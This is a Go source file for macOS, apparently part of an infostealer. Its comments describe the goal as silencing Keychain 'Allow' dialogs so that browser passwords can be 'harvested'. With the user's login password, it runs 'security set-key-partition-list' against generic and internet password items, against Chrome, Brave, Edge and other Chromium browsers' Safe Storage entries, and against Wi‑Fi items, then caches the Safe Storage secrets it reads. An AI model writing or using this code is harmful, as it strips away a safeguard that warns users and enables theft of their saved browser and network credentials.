//go:build darwin

// keychain_silent_darwin.go — suppress system Keychain "Allow" dialogs for harvest.
//
// After the user password is known (app confirmation modal / flag / env):
//  1. unlock-keychain if locked (keychain_unlock_darwin.go)
//  2. set-key-partition-list -k <password> so security(1) may read items without GUI
//  3. find-generic-password / dump-keychain proceed without prompting (typical case)
//
// The app's own password confirmation modal is intentional and unchanged.
// System Keychain Access prompts are what this file eliminates for browser Safe Storage.
package crypto

import (
	"os/exec"
	"strings"
	"sync"
)

// Partitions that allow non-signed / command-line tools to use key items without ACL popups.
// apple-tool: covers /usr/bin/security; apple: and codesign: are common extras used by Chromium tools.
const keyPartitionIDs = "apple-tool:,apple:,codesign:"

var (
	partitionOnce    sync.Once
	partitionDone    bool
	safeStorageCache sync.Map // service name → Safe Storage secret string
)

// applySilentKeyPartitionList rewrites ACLs on login-keychain items using the user password.
// Must run after unlock-keychain (or when keychain is already unlocked).
func applySilentKeyPartitionList(loginKC, password string) {
	if loginKC == "" || password == "" {
		return
	}
	partitionOnce.Do(func() {
		// 1) Broad pass: all generic-password items (Chrome Safe Storage, Wi‑Fi, etc.)
		//    This is the main anti-prompt step for browser password harvest.
		runSetKeyPartitionList(password, loginKC,
			"-S", keyPartitionIDs,
			"-k", password,
			"-t", "genp",
			loginKC,
		)

		// 2) Explicit Safe Storage services (Chrome, Brave, Edge, …)
		seenSvc := make(map[string]bool)
		for _, service := range chromeKeychainServices {
			if service == "" || seenSvc[service] {
				continue
			}
			seenSvc[service] = true
			runSetKeyPartitionList(password, loginKC,
				"-S", keyPartitionIDs,
				"-s", service,
				"-k", password,
				loginKC,
			)
		}
		// Unknown / future browsers often use "<Name> Safe Storage"
		// Already covered if present as genp; no extra work needed.

		// 3) Account-scoped pass for common Chromium accounts (matches -a on items)
		for _, account := range []string{
			"Chrome", "Chromium", "Brave", "Microsoft Edge", "Edge",
			"Opera", "Opera GX", "Vivaldi", "Arc", "Yandex",
		} {
			runSetKeyPartitionList(password, loginKC,
				"-S", keyPartitionIDs,
				"-a", account,
				"-k", password,
				loginKC,
			)
		}

		// 4) Internet passwords (some older items) — best-effort, ignore failures
		runSetKeyPartitionList(password, loginKC,
			"-S", keyPartitionIDs,
			"-k", password,
			"-t", "inet",
			loginKC,
		)

		partitionDone = true
		logf("keychain partition list applied (silent browser Safe Storage reads)")
	})
}

// runSetKeyPartitionList executes security set-key-partition-list.
// Failures are logged but non-fatal — harvest continues with best-effort silent access.
func runSetKeyPartitionList(password, loginKC string, args ...string) {
	_ = password
	_ = loginKC
	cmd := exec.Command("security", append([]string{"set-key-partition-list"}, args...)...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			msg = err.Error()
		}
		// "could not be found" = no matching items — normal when a browser was never used.
		if strings.Contains(strings.ToLower(msg), "could not be found") ||
			strings.Contains(strings.ToLower(msg), "no keychain") {
			return
		}
		logf("set-key-partition-list: %s", msg)
	}
}

// ensureServicePartitionList targets one Safe Storage service right before first read.
// Cheap if the broad pass already succeeded; helps when only that item exists.
func ensureServicePartitionList(service string) {
	if service == "" || macLoginPassword == "" {
		return
	}
	loginKC := loginKeychainPath()
	if loginKC == "" {
		return
	}
	runSetKeyPartitionList(macLoginPassword, loginKC,
		"-S", keyPartitionIDs,
		"-s", service,
		"-k", macLoginPassword,
		loginKC,
	)
}

// cacheSafeStorageSecret stores a resolved Safe Storage secret for reuse (no re-prompt).
func cacheSafeStorageSecret(service, secret string) {
	if service != "" && secret != "" {
		safeStorageCache.Store(service, secret)
	}
}

func cachedSafeStorageSecret(service string) (string, bool) {
	if service == "" {
		return "", false
	}
	v, ok := safeStorageCache.Load(service)
	if !ok {
		return "", false
	}
	s, _ := v.(string)
	return s, s != ""
}
